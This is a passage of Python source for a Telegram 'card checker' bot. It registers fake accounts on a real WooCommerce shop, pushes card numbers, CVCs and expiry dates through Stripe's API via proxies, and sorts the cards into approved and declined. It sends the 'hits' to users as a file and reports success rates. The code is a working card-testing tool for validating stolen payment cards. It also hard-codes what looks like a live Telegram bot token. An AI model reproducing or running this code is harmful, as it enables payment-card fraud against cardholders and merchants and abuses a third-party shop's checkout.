                        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                        'woocommerce-register-nonce': nonce1,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register'
                    }
                    
                    async with session.post(f'{self.base_url}/my-account/', headers=headers, data=reg_data, proxy=proxy) as response:
                        if response.status != 200:
                            return False, status, "Account registration failed"

                    # Step 3: Get payment nonce
                    async with session.get(f'{self.base_url}/my-account/add-payment-method/', headers=headers, proxy=proxy) as response:
                        response_text = await response.text()
                        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response_text)
                        if not payment_nonce_match:
                            return False, status, "Failed to get payment nonce"
                        payment_nonce = payment_nonce_match.group(1)

                    # Step 4: Create Stripe payment method
                    stripe_headers = {
                        'accept': 'application/json',
                        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://js.stripe.com',
                        'priority': 'u=1, i',
                        'referer': 'https://js.stripe.com/',
                        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-site',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
                    }
                    
                    stripe_data = {
                        'type': 'card',
                        'card[number]': n,
                        'card[cvc]': cvc,
                        'card[exp_year]': yy,
                        'card[exp_month]': mm,
                        'allow_redisplay': 'unspecified',
                        'billing_details[address][postal_code]': '10006',
                        'billing_details[address][country]': 'US',
                        'pasted_fields': 'number',
                        'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
                        'referrer': 'https://fancyimpress.com',
                        'client_attribution_metadata[client_session_id]': '5e87df1d-037b-4347-bf59-a0275ab75d8c',
                        'client_attribution_metadata[merchant_integration_source]': 'elements',
                        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                        'client_attribution_metadata[merchant_integration_version]': '2021',
                        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                        'client_attribution_metadata[elements_session_config_id]': 'b355f674-ee2e-4ad4-8466-d4c4194efa13',
                        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                        'guid': '709da624-dcd1-4705-ab97-bae288dcf2dbabb8f4',
                        'muid': 'd1756bf1-2ac1-4a34-b974-a6ec6e709b0f2eee97',
                        'sid': '4d7f4d0e-fe0b-4da9-9966-1f540326a434c5bdc1',
                        'key': self.stripe_key,
                        '_stripe_version': '2024-06-20'
                    }
                    
                    async with session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy) as stripe_res:
                        stripe_response_text = await stripe_res.text()
                        stripe_json = json.loads(stripe_response_text) if stripe_response_text else {}
                        
                        if stripe_res.status != 200 or 'id' not in stripe_json:
                            if 'error' in stripe_json:
                                error_message = stripe_json['error'].get('message', 'Unknown error')
                            else:
                                error_message = "Payment method creation failed"
                            logger.error(f"Stripe error: {stripe_response_text}")
                            return False, status, error_message
                        
                        payment_method_id = stripe_json['id']

                    # Step 5: Add payment method to account
                    headers = {
                        'Accept': '*/*',
                        'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                        'Connection': 'keep-alive',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Origin': 'https://fancyimpress.com',
                        'Referer': 'https://fancyimpress.com/my-account/add-payment-method/',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                        'X-Requested-With': 'XMLHttpRequest',
                        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                    }
                    
                    confirm_data = {
                        'action': 'wc_stripe_create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': payment_method_id,
                        'wc-stripe-payment-type': 'card',
                        '_ajax_nonce': payment_nonce,
                    }
                    
                    async with session.post(f'{self.base_url}/wp-admin/admin-ajax.php', headers=headers, data=confirm_data, proxy=proxy) as confirm_res:
                        confirm_response_text = await confirm_res.text()
                        logger.info(f"Full site response: {confirm_response_text}")
                        
                        if confirm_response_text:
                            try:
                                confirm_json = json.loads(confirm_response_text)
                                success = confirm_json.get("success")
                                status_data = confirm_json.get("data", {}).get("status")
                                
                                if success is True and status_data == "succeeded":
                                    check_time = (datetime.now() - start_time).total_seconds()
                                    return combo, status, None
                                else:
                                    error_message = "Card declined"
                                    if confirm_json.get("data", {}).get("error", {}).get("message"):
                                        error_message = confirm_json["data"]["error"]["message"]
                                    elif confirm_json.get("message"):
                                        error_message = confirm_json["message"]
                                    
                                    logger.error(f"Site error response: {confirm_response_text}")
                                    return False, status, error_message
                            except json.JSONDecodeError:
                                error_message = "Invalid response from server"
                                return False, status, error_message
                        else:
                            error_message = "Empty response from server"
                            return False, status, error_message

            except aiohttp.ClientError as e:
                error_message = f"Network error: {str(e)}"
                return False, status, error_message
            except asyncio.TimeoutError:
                error_message = "Request timeout"
                return False, status, error_message
            except Exception as e:
                logger.error(f"Processing error: {str(e)}")
                error_message = f"System error: {str(e)}"
                return False, status, error_message

    async def send_approval(self, update, combo, bin_info, check_time, user):
        message = await self.format_approval_message(combo, bin_info, check_time, user)
        try:
            await update.message.reply_text(
                message, 
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 View Stats", callback_data='stats'),
                     InlineKeyboardButton("🛑 Stop Check", callback_data='cancel')]
                ])
            )
        except Exception as e:
            logger.error(f"Failed to send approval: {str(e)}")

    async def send_3d_secure_message(self, update, combo, bin_info, check_time, user):
        message = await self.format_3d_secure_message(combo, bin_info, check_time, user)
        try:
            await update.message.reply_text(
                message, 
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 View Stats", callback_data='stats'),
                     InlineKeyboardButton("🛑 Stop Check", callback_data='cancel')]
                ])
            )
        except Exception as e:
            logger.error(f"Failed to send 3D secure message: {str(e)}")

    async def send_declined_message(self, update, combo, bin_info, check_time, error_message, user):
        message = await self.format_declined_message(combo, bin_info, check_time, error_message, user)
        try:
            await update.message.reply_text(
                message, 
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 View Stats", callback_data='stats'),
                     InlineKeyboardButton("🛑 Stop Check", callback_data='cancel')]
                ])
            )
        except Exception as e:
            logger.error(f"Failed to send declined message: {str(e)}")

    async def send_progress_update(self, user_id, update):
        stats = self.user_stats[user_id]
        elapsed = datetime.now() - stats['start_time']
        progress = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
[✪] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {stats['checked']}/{stats['total']}
[✪] 𝐓𝐨𝐭𝐚𝐥:: {stats['total']}
[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {elapsed.seconds // 60}m {elapsed.seconds % 60}s
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {stats['total']/elapsed.seconds if elapsed.seconds else 0:.1f} c/s
[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {(stats['approved']/stats['total'])*100:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈
━━━━━━━━━━━━━━━━━━━━━━"""
        await self.send_message(update, progress)

    async def generate_hits_file(self, approved_ccs, total_ccs):
        random_number = random.randint(0, 9999)
        filename = f"hits_FnChecker_{random_number:04d}.txt"
        
        header = f"""━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {len(approved_ccs)}
[✪] 𝐓𝐨𝐭𝐚𝐥: {total_ccs}
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈
━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━
𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒
━━━━━━━━━━━━━━━━━━━━━━
"""
        
        cc_entries = "\n".join([f"Approved ✅ {cc}" for cc in approved_ccs])
        full_content = header + cc_entries
        
        with open(filename, "w", encoding="utf-8") as f:
            f.write(full_content)
        
        return filename

    async def send_report(self, user_id, update):
        stats = self.user_stats[user_id]
        elapsed = datetime.now() - stats['start_time']
        report = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
[✪] 𝐓𝐨𝐭𝐚𝐥:: {stats['total']}
[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {elapsed.seconds // 60}m {elapsed.seconds % 60}s
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {stats['total']/elapsed.seconds if elapsed.seconds else 0:.1f} c/s
[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {(stats['approved']/stats['total'])*100:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈
━━━━━━━━━━━━━━━━━━━━━━"""
        
        # Generate and send hits file
        try:
            hits_file = await self.generate_hits_file(stats['approved_ccs'], stats['total'])
            await update.message.reply_document(
                document=open(hits_file, 'rb'),
                caption="FN Checker Results Attached"
            )
            os.remove(hits_file)
        except Exception as e:
            logger.error(f"Failed to send hits file: {str(e)}")
        
        await self.send_message(update, report)
        if user_id in self.user_stats:
            del self.user_stats[user_id]

    async def show_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in self.user_stats:
            await self.send_message(update, "📊 No statistics available")
            return
            
        stats = self.user_stats[user_id]
        elapsed = datetime.now() - stats['start_time']
        message = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐓𝐀𝐓𝐈𝐂𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
[✪] 𝐓𝐨𝐭𝐚𝐥:: {stats['total']}
[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {elapsed.seconds // 60}m {elapsed.seconds % 60}s
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {stats['total']/elapsed.seconds if elapsed.seconds else 0:.1f} c/s
[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {(stats['approved']/stats['total'])*100:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈
━━━━━━━━━━━━━━━━━━━━━━"""
        await self.send_message(update, message)

    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id in self.active_tasks:
            self.active_tasks[user_id].cancel()
            del self.active_tasks[user_id]
            await self.send_message(update, "⏹️ Process cancelled")
            if user_id in self.user_stats:
                del self.user_stats[user_id]
            # Clean up user semaphore
            self.cleanup_user_semaphore(user_id)
        else:
            await self.send_message(update, "⚠️ No active process")

    async def send_message(self, update, text):
        try:
            await update.message.reply_text(text, parse_mode='HTML')
        except:
            try:
                await update.callback_query.message.reply_text(text, parse_mode='HTML')
            except:
                logger.error("Failed to send message")

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        logger.error(msg="Exception:", exc_info=context.error)
        await self.send_message(update, f"⚠️ System Error: {str(context.error)}")

def main():
    checker = AdvancedCardChecker()
    application = Application.builder().token("8122009466:AAG5K2m4PTt-IobQlhiVDfnfbkEyi8JlQfM").post_init(checker.post_init).build()
    checker.application = application
    
    handlers = [
        CommandHandler('start', checker.start),
        CommandHandler('allow', checker.handle_admin_command),
        CommandHandler('deny', checker.handle_admin_command),
        CommandHandler('stop', checker.stop_command),
        CommandHandler('stats', checker.show_stats),
        CommandHandler('help', checker.show_help),
        CommandHandler('chk', checker.chk_command),
        CommandHandler('fchk', checker.fchk_command),
        CommandHandler('broadcast', checker.broadcast_command),
        CommandHandler('genkey', checker.genkey_command),
        CommandHandler('redeem', checker.redeem_command),
        MessageHandler(filters.Document.TXT, checker.handle_file),
        CallbackQueryHandler(checker.button_handler)
    ]
    
    for handler in handlers:
        application.add_handler(handler)

    application.add_error_handler(checker.error_handler)
    application.run_polling()


if __name__ == "__main__":
    main()
